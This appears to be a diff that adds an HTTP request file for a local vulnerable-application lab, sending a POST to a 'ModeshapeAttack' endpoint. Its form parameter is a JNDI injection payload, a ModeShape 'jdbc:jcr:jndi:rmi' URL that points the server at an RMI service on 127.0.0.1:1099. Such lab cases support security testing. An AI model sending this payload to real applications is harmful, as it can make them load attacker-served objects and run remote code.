@@ -1,0 +1,11 @@
+###
+POST /JDBC/ModeshapeAttack/case1 HTTP/1.1
+Host: 127.0.0.1:8080
+Content-Type: application/x-www-form-urlencoded
+
+param=jdbc:jcr:jndi:rmi://127.0.0.1:1099/f64tsv
+
+
+
+
+
